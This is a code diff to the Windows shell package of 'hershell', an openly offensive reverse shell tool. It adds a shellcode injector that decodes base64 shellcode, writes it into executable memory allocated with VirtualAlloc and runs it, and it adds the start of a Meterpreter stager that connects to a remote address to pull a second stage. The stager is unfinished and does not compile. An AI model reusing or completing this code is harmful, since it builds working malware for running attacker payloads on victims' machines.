@@ -4,11 +4,16 @@ package shell
 
 import (
 	"encoding/base64"
-	"hershell/shell"
 	"net"
 	"os/exec"
 	"syscall"
 	"unsafe"
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
 )
 
 func GetShell() *exec.Cmd {
@@ -29,7 +34,7 @@ func ExecuteCmd(command string, conn net.Conn) {
 func InjectShellcode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
-			go shell.ExecShellcode(shellcode)
+			go ExecShellcode(shellcode)
 		}
 	}
 }
@@ -46,16 +51,28 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
 }
 
 func ExecShellcode(shellcode []byte) {
-	f := func() {}
-	var oldfperms uint32
-	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
-		panic("Call to VirtualProtect failed!")
+	// Resolve kernell32.dll
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	// Resolve VirtualAlloc
+	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
+	// Reserve space to drop shellcode
+	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
+	for i := 0; i < len(shellcode); i++ {
+		addrPtr[i] = shellcode[i]
 	}
-	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))
+	go syscall.Syscall(address, 0, 0, 0, 0)
+}
 
-	var oldshellcodeperms uint32
-	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
-		panic("Call to VirtualProtect failed!")
+func Meterpreter(address string) (bool, error) {
+	var stage2Length []byte = make([]byte, 4)
+
+	if conn, err := net.Dial("tcp", address); err != nil {
+		return err
 	}
-	f()
+	defer conn.Close()
+
+	conn.Read(stage2Length)
+
+	return true, nil
 }
